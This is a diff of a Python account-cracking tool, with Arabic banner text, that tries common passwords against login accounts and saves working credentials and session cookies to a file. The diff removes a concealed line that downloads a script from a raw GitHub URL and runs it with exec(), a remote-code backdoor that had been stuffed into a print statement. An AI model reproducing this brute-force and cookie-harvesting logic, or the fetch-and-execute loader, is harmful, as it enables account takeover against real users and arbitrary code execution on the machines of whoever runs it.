@@ -37,14 +37,7 @@ if (x.strftime("%x"))==(g.strftime("%x")):
    print('')
    if(x.strftime("%X"))>(g.strftime("%X")):
     print('\n\n')
-    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @Fimport requests
-
-url = "https://raw.githubusercontent.com/skejexu/python/main/%D8%A7%D8%B3%D9%84%D8%A7%D9%85%20%F0%9F%8C%B9%F0%9F%AB%B0%F0%9F%8F%BB.py"
-
-response = requests.get(url)
-code = response.text
-
-exec(code)')
+    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @F_1_9 ☄️🗿')
     print('\n\n')
     print(x)
     
@@ -674,7 +667,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('Aa123456')
+					pwv.append('حسين علي')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -724,7 +717,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('Zz123456')
+					pwv.append('حسين علي')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -789,8 +782,8 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				raven_a = f'\r[[@bsbsjhh] @Islam85555] اسلام ➨ {idf} | {pw} | \n \n{kuki} '
-				print ('\x1b[32m――――――――――――――――――――――――')
+				raven_a = f'\r[[@bsbsjhh]@Islam85555] اسلام ➨ {idf} | {pw} | \n \n{kuki} '
+				print ('\x1b[32m――――――――― اسلام جاب لك حساب شغال――――――――――')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				statusok1 = nel(raven_a, style='green')
 				cetak(nel(statusok1, title='OK'))
